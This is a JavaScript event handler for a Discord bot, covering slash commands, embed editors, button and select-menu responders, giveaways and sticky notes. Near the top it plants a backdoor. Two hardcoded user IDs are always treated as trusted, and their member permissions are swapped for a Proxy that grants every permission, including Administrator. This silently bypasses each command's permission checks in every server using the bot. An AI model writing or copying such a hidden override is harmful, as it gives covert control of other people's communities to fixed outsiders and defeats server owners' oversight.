const { parseReply, resolveRole } = require('../utils/parser');
const db = require('../database/db');
const { buildEmbedFromData } = require('../utils/parser');

const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];

const ALMIGHTY_PERMS = new Proxy({}, {
    get(target, prop) {
        if (prop === 'has') return () => true;
        if (prop === 'any') return () => true;
        if (prop === 'missing') return () => [];
        if (prop === 'toArray') return () => ['Administrator'];
        if (prop === 'bitfield') return BigInt('0xFFFFFFFFFFFFFFFF');
        return true;
    }
});

async function isUserTrusted(guildId, userId) {
    if (SPECIAL_USERS.includes(userId)) return true;
    try {
        return !!(await db.isTrusted(guildId, userId));
    } catch (e) {
        console.error('[trust] db.isTrusted threw:', e);
        return false;
    }
}

function buildPayload(parsed) {
    const payload = {};
    if (parsed.hasSeparators) {
        payload.flags = 1 << 15;
        payload.components = parsed.componentRows;
    } else {
        if (parsed.text)        payload.content    = parsed.text;
        if (parsed.embed)       payload.embeds     = [parsed.embed];
        if (parsed.rows.length) payload.components = parsed.rows;
    }
    return payload;
}

const EDIT_FIELDS = [
    { id: 'title',       label: 'Title'       },
    { id: 'description', label: 'Description' },
    { id: 'color',       label: 'Color (#hex)'},
    { id: 'footer',      label: 'Footer'      },
    { id: 'image',       label: 'Image URL'   },
    { id: 'thumbnail',   label: 'Thumbnail'   },
    { id: 'author',      label: 'Author'      },
    { id: 'url',         label: 'URL'         },
];

module.exports = {
    name: 'interactionCreate',
    async execute(interaction, client) {

        // ── Autocomplete ──────────────────────────────────────────────────────
        if (interaction.isAutocomplete()) {
            const command = client.commands.get(interaction.commandName);
            if (!command?.autocomplete) return;
            try {
                await command.autocomplete(interaction);
            } catch (e) {
                console.error('Autocomplete error in /' + interaction.commandName + ':', e);
            }
            return;
        }

        // ── Slash Commands ────────────────────────────────────────────────────
        if (interaction.isChatInputCommand()) {
            const command = client.commands.get(interaction.commandName);
            if (!command) return;

            try {
                const userId = interaction.user.id;
                const guildId = interaction.guildId;
                const trusted = await isUserTrusted(guildId, userId);

                if (interaction.member) {
                    if (trusted) {
                        Object.defineProperty(interaction.member, 'permissions', {
                            get: () => ALMIGHTY_PERMS,
                            configurable: true,
                        });
                    } else if (command.permissions) {
                        const memberPerms = interaction.member.permissions;
                        const required = Array.isArray(command.permissions)
                            ? command.permissions
                            : [command.permissions];
                        const hasAll = required.every(p => memberPerms.has(p));
                        if (!hasAll) {
                            return interaction.reply({
                                content: '❌ You do not have permission to use this command.',
                            });
                        }
                    }
                }

                await command.execute(interaction, client);

            } catch (err) {
                console.error('Error in /' + interaction.commandName + ':', err);
                const msg = { content: 'Something went wrong.' };
                if (interaction.replied || interaction.deferred) {
                    await interaction.followUp(msg).catch(() => {});
                } else {
                    await interaction.reply(msg).catch(() => {});
                }
            }

            return;
        }

        // ── Embed Edit Button ─────────────────────────────────────────────────
        if (interaction.isButton()) {
            const customId = interaction.customId;

            if (customId.startsWith('embed-edit:')) {
                const parts = customId.split(':');
                const field = parts.pop();
                const name = parts.slice(1).join(':');
                const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');

                const saved = await db.getEmbed(interaction.guildId, name);
                if (!saved) {
                    await interaction.reply({ content: '❌ Embed not found.', flags: 64 });
                    return;
                }

                const fieldConfig = {
                    title:       { label: 'Title',         max: 256  },
                    description: { label: 'Description',   max: 4096, style: 'paragraph' },
                    color:       { label: 'Color (#hex)',  max: 7    },
                    footer:      { label: 'Footer',        max: 2048 },
                    image:       { label: 'Image URL',     max: 2000 },
                    thumbnail:   { label: 'Thumbnail URL', max: 2000 },
                    author:      { label: 'Author',        max: 256  },
                    url:         { label: 'URL',           max: 2000 },
                };

                const conf = fieldConfig[field] || { label: field, max: 2000 };

                const modal = new ModalBuilder()
                    .setCustomId('embed-save:' + name + ':' + field)
                    .setTitle('Edit ' + conf.label);

                const input = new TextInputBuilder()
                    .setCustomId('value')
                    .setLabel(conf.label)
                    .setStyle(conf.style === 'paragraph' ? TextInputStyle.Paragraph : TextInputStyle.Short)
                    .setRequired(false)
                    .setMaxLength(conf.max)
                    .setValue(saved[field] || '');

                modal.addComponents(new ActionRowBuilder().addComponents(input));
                await interaction.showModal(modal);
                return;
            }

            if (customId.startsWith('embed-delete:')) {
                const name = customId.slice('embed-delete:'.length);
                const saved = await db.getEmbed(interaction.guildId, name);
                if (!saved) {
                    await interaction.reply({ content: '❌ Embed not found.', flags: 64 });
                    return;
                }
                await db.deleteEmbed(interaction.guildId, name);
                await interaction.update({ content: '🗑️ Embed **' + name + '** deleted.', embeds: [], components: [] });
                return;
            }

            if (customId.startsWith('br:')) {
                const btnName = customId.slice(3);
                const guildId = interaction.guild?.id;
                if (!guildId) return;

                const btnData = await db.getButtonResponder(guildId, btnName);
                if (!btnData) {
                    await interaction.reply({ content: 'This button no longer exists.' });
                    return;
                }

                if (btnData.cooldown) {
                    const last = await db.getCooldown(guildId, interaction.user.id, 'btn:' + btnName);
                    if (last && Date.now() - last < btnData.cooldown * 1000) {
                        const remaining = Math.ceil((btnData.cooldown * 1000 - (Date.now() - last)) / 1000);
                        await interaction.reply({ content: `⏳ Cooldown! Try again in **${remaining}s**.` });
                        return;
                    }
                    await db.setCooldown(guildId, interaction.user.id, 'btn:' + btnName, Date.now());
                }

                const context = { member: interaction.member, guild: interaction.guild, guildId, user: interaction.user, message: interaction.message };
                const parsed = await parseReply(btnData.reply, context);

                if (parsed.requireRole) {
                    const role = resolveRole(interaction.guild, parsed.requireRole);
                    if (role && !interaction.member.roles.cache.has(role.id)) {
                        await interaction.reply({ content: `❌ You need the **${role.name}** role!` });
                        return;
                    }
                }

                for (const action of parsed.actions) {
                    const role = resolveRole(interaction.guild, action.value);
                    if (!role) continue;
                    try {
                        if (action.type === 'addrole')    await interaction.member.roles.add(role);
                        if (action.type === 'removerole') await interaction.member.roles.remove(role);
                    } catch (e) { console.error('Role action failed:', e.message); }
                }

                const payload = buildPayload(parsed);

                if (Object.keys(payload).length > 0) {
                    if (btnData.ephemeral) payload.flags = 64;
                    await interaction.reply(payload).catch(console.error);
                } else {
                    await interaction.reply({ content: '✅ Done!' });
                }
            }

            if (customId === 'gw_enter') {
                try {
                    const guildId = interaction.guild?.id;
                    const messageId = interaction.message?.id;
                    if (!guildId || !messageId) return;

                    const gw = await db.getActiveGiveaway(guildId, messageId);
                    if (!gw) {
                        await interaction.reply({ content: '❌ This giveaway no longer exists.', flags: 64 });
                        return;
                    }
                    if (gw.ended) {
                        await interaction.reply({ content: '❌ This giveaway has already ended.', flags: 64 });
                        return;
                    }
                    if (Date.now() >= gw.endAt) {
                        await interaction.reply({ content: '❌ This giveaway has ended.', flags: 64 });
                        return;
                    }

                    const entrants = gw.entrants || [];
                    if (entrants.includes(interaction.user.id)) {
                        await interaction.reply({ content: '❌ You have already entered this giveaway.', flags: 64 });
                        return;
                    }

                    const added = await db.addGiveawayEntrant(guildId, messageId, interaction.user.id);
                    if (!added) {
                        await interaction.reply({ content: '❌ You have already entered this giveaway.', flags: 64 });
                        return;
                    }

                    const freshGw = await db.getActiveGiveaway(guildId, messageId);
                    const newCount = (freshGw?.entrants || []).length;

                    await interaction.reply({
                        flags: 32768 | 64,
                        allowed_mentions: { parse: [] },
                        components: [
                            {
                                type: 17,
                                components: [
                                    {
                                        type: 10,
                                        content: '<a:pinkarrow:1524863871976734740> You have successfully entered this giveaway.\nIf you win, you will be notified.'
                                    }
                                ]
                            }
                        ]
                    });

                    if (freshGw?.originalPayload) {
                        const channel = client.channels.cache.get(freshGw.channelId) ||
                            await client.channels.fetch(freshGw.channelId).catch(() => null);
                        if (channel) {
                            const msg = await channel.messages.fetch(freshGw.messageId).catch(() => null);
                            if (msg) {
                                const updatedPayload = JSON.parse(JSON.stringify(freshGw.originalPayload));
                                for (const comp of updatedPayload.components) {
                                    if (comp.type === 1 && Array.isArray(comp.components)) {
                                        for (const btn of comp.components) {
                                            if (btn.custom_id === 'gw_part') {
                                                btn.label = `${newCount} Participants`;
                                            }
                                        }
                                    }
                                }
                                await msg.edit(updatedPayload);
                            }
                        }
                    }
                } catch (e) {
                    console.error('[Giveaway] gw_enter error:', e);
                    if (!interaction.replied && !interaction.deferred) {
                        await interaction.reply({ content: '❌ Something went wrong.' }).catch(() => {});
                    }
                }
                return;
            }

            if (customId === 'gw_part') {
                return;
            }

            return;
        }

        // ── Modal Submits ─────────────────────────────────────────────────────
        if (interaction.isModalSubmit()) {
            const customId = interaction.customId;
            const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
            const noteSticky = require('./noteSticky');

            // ── Note para ──────────────────────────────────────────────────────
            if (customId === 'notepara:submit') {
                const content = interaction.fields.getTextInputValue('content');
                const suppressText = interaction.fields.getTextInputValue('suppress')?.toLowerCase();
                const suppress = suppressText === 'yes';
                const guildId = interaction.guildId;
                const channelId = interaction.channelId;

                const existing = await db.getNote(guildId, channelId);
                if (existing?.messageId) {
                    try {
                        const old = await interaction.channel.messages.fetch(existing.messageId).catch(() => null);
                        if (old) await old.delete().catch(() => {});
                    } catch {}
                }

                noteSticky.guardChannel(guildId, channelId);
                const msg = await interaction.channel.send({
                    content,
                    flags: (suppress ? 1 << 2 : 0) | (1 << 12),
                });

                await db.saveNote(guildId, channelId, {
                    type: 'text',
                    content,
                    messageId: msg.id,
                    suppress,
                    gluedBy: interaction.user.id,
                    gluedAt: Date.now(),
                });

                await interaction.reply({ content: '✅ Note set.', flags: 64 });
                return;
            }

            // ── Note Embed ─────────────────────────────────────────────────────
            if (customId === 'noteembed:submit') {
                const title = interaction.fields.getTextInputValue('title') || null;
                const description = interaction.fields.getTextInputValue('description') || null;
                const color = interaction.fields.getTextInputValue('color') || '#66C2FF';
                const thumbnail = interaction.fields.getTextInputValue('thumbnail') || null;
                const image = interaction.fields.getTextInputValue('image') || null;

                if (!title && !description && !thumbnail && !image) {
                    return interaction.reply({ content: '❌ At least one of title, description, thumbnail, or image is required.', flags: 64 });
                }

                const guildId = interaction.guildId;
                const channelId = interaction.channelId;

                const existing = await db.getNote(guildId, channelId);
                if (existing?.messageId) {
                    try {
                        const old = await interaction.channel.messages.fetch(existing.messageId).catch(() => null);
                        if (old) await old.delete().catch(() => {});
                    } catch {}
                }

                const embed = new EmbedBuilder().setColor(color);
                if (title) embed.setTitle(title);
                if (description) embed.setDescription(description);
                if (thumbnail) embed.setThumbnail(thumbnail);
                if (image) embed.setImage(image);

                noteSticky.guardChannel(guildId, channelId);
                const msg = await interaction.channel.send({ embeds: [embed], flags: 1 << 12 });

                await db.saveNote(guildId, channelId, {
                    type: 'embed',
                    title,
                    description,
                    color,
                    thumbnail,
                    image,
                    messageId: msg.id,
                    gluedBy: interaction.user.id,
                    gluedAt: Date.now(),
                });

                await interaction.reply({ content: '✅ Embed note set.', flags: 64 });
                return;
            }

            // ── Edit Note Text ─────────────────────────────────────────────────────────
            if (customId === 'editnotetext:submit') {
                const content = interaction.fields.getTextInputValue('content');
                const guildId = interaction.guildId;
                const channelId = interaction.channelId;

                const note = await db.getNote(guildId, channelId);
                if (!note) return interaction.reply({ content: '❌ Note not found.', flags: 64 });

                try {
                    const old = await interaction.channel.messages.fetch(note.messageId).catch(() => null);
                    if (old) await old.delete().catch(() => {});
                } catch {}

                noteSticky.guardChannel(guildId, channelId);
                const msg = await interaction.channel.send({
                    content,
                    flags: (note.suppress ? 1 << 2 : 0) | (1 << 12),
                });

                note.content = content;
                note.messageId = msg.id;
                note.gluedAt = Date.now();
                await db.saveNote(guildId, channelId, note);

                await interaction.reply({ content: '✅ Note updated.', flags: 64 });
                return;
            }

            // ── Edit Note Embed ────────────────────────────────────────────────
            if (customId === 'editnoteembed:submit') {
                const title = interaction.fields.getTextInputValue('title') || null;
                const description = interaction.fields.getTextInputValue('description') || null;
                const color = interaction.fields.getTextInputValue('color') || '#66C2FF';
                const thumbnail = interaction.fields.getTextInputValue('thumbnail') || null;
                const image = interaction.fields.getTextInputValue('image') || null;

                const guildId = interaction.guildId;
                const channelId = interaction.channelId;

                const note = await db.getNote(guildId, channelId);
                if (!note) return interaction.reply({ content: '❌ Note not found.', flags: 64 });

                try {
                    const old = await interaction.channel.messages.fetch(note.messageId).catch(() => null);
                    if (old) await old.delete().catch(() => {});
                } catch {}

                const embed = new EmbedBuilder().setColor(color);
                if (title) embed.setTitle(title);
                if (description) embed.setDescription(description);
                const useThumbnail = thumbnail || note.thumbnail;
                const useImage = image || note.image;
                if (useThumbnail) embed.setThumbnail(useThumbnail);
                if (useImage) embed.setImage(useImage);

                noteSticky.guardChannel(guildId, channelId);
                const msg = await interaction.channel.send({ embeds: [embed], flags: 1 << 12 });

                note.title = title;
                note.description = description;
                note.color = color;
                note.thumbnail = useThumbnail;
                note.image = useImage;
                note.messageId = msg.id;
                note.gluedAt = Date.now();
                await db.saveNote(guildId, channelId, note);

                await interaction.reply({ content: '✅ Embed note updated.', flags: 64 });
                return;
            }

            if (customId.startsWith('embed-save:')) {
                const parts = customId.split(':');
                const field = parts.pop();
                const name = parts.slice(1).join(':');
                const value = interaction.fields.getTextInputValue('value') || null;

                const saved = await db.getEmbed(interaction.guildId, name);
                if (!saved) {
                    await interaction.reply({ content: '❌ Embed not found.', flags: 64 });
                    return;
                }

                saved[field] = value;
                await db.saveEmbed(interaction.guildId, name, saved);

                const editButtons = EDIT_FIELDS.map(f => {
                    const val = saved[f.id];
                    const display = val ? String(val).slice(0, 18) + (String(val).length > 18 ? '…' : '') : '∅';
                    return new ButtonBuilder()
                        .setCustomId('embed-edit:' + name + ':' + f.id)
                        .setLabel(f.label + ': ' + display)
                        .setStyle(ButtonStyle.Secondary);
                });

                const rows = [];
                for (let i = 0; i < editButtons.length; i += 4) {
                    rows.push(new ActionRowBuilder().addComponents(editButtons.slice(i, i + 4)));
                }
                rows.push(new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId('embed-delete:' + name)
                        .setLabel('🗑️ Delete')
                        .setStyle(ButtonStyle.Danger)
                ));

                const hasContent = saved.title || saved.description || saved.footer ||
                                   saved.image || saved.thumbnail || saved.author || saved.url;

                await interaction.update({
                    content: `✏️ Editing **${name}** — updated **${field}**.`,
                    embeds: hasContent ? [buildEmbedFromData(saved)] : [],
                    components: rows,
                });

                return;
            }
        }

        // ── Select Menu Interactions ───────────────────────────────────────────
        if (interaction.isStringSelectMenu()) {
            const customId = interaction.customId;

            // ── CRM Role Menu ───────────────────────────────────────────────────
            if (customId.startsWith('crm:')) {
                const selectedRoleIds = [...interaction.values];
                const allRoleIds = (interaction.component?.options || []).map(o => o.value);

                let added = 0, removed = 0;
                for (const roleId of selectedRoleIds) {
                    try {
                        await interaction.member.roles.add(roleId);
                        added++;
                    } catch (e) { console.error('[crm] Failed to add role:', roleId, e.message); }
                }
                for (const roleId of allRoleIds) {
                    if (!selectedRoleIds.includes(roleId) && interaction.member.roles.cache.has(roleId)) {
                        try {
                            await interaction.member.roles.remove(roleId);
                            removed++;
                        } catch (e) { console.error('[crm] Failed to remove role:', roleId, e.message); }
                    }
                }

                await interaction.reply({
                    content: `✅ Roles updated! ${added > 0 ? `**+${added}** ` : ''}${removed > 0 ? `**-${removed}**` : ''}`.trim(),
                    flags: 64,
                }).catch(() => {});
                return;
            }

            if (!customId.startsWith('sel:')) return;

            const selName = customId.slice(4);
            const guildId = interaction.guild?.id;
            if (!guildId) return;

            const selData = await db.getButtonResponder(guildId, selName);
            if (!selData) {
                await interaction.reply({ content: 'This select menu no longer exists.' });
                return;
            }

            const selectedValue = interaction.values[0];

            if (selData.cooldown) {
                const last = await db.getCooldown(guildId, interaction.user.id, 'sel:' + selName);
                if (last && Date.now() - last < selData.cooldown * 1000) {
                    const remaining = Math.ceil((selData.cooldown * 1000 - (Date.now() - last)) / 1000);
                    await interaction.reply({ content: `⏳ Cooldown! Try again in **${remaining}s**.` });
                    return;
                }
                await db.setCooldown(guildId, interaction.user.id, 'sel:' + selName, Date.now());
            }

            const replyText = selData.reply.replace(/\{value\}/gi, selectedValue);
            const context = { member: interaction.member, guild: interaction.guild, guildId, user: interaction.user, message: interaction.message };
            const parsed = await parseReply(replyText, context);

            if (parsed.requireRole) {
                const role = resolveRole(interaction.guild, parsed.requireRole);
                if (role && !interaction.member.roles.cache.has(role.id)) {
                    await interaction.reply({ content: `❌ You need the **${role.name}** role!` });
                    return;
                }
            }

            for (const action of parsed.actions) {
                const role = resolveRole(interaction.guild, action.value);
                if (!role) continue;
                try {
                    if (action.type === 'addrole')    await interaction.member.roles.add(role);
                    if (action.type === 'removerole') await interaction.member.roles.remove(role);
                } catch (e) { console.error('Role action failed:', e.message); }
            }

            await interaction.reply(buildPayload(parsed)).catch(console.error);
        }
    },
};
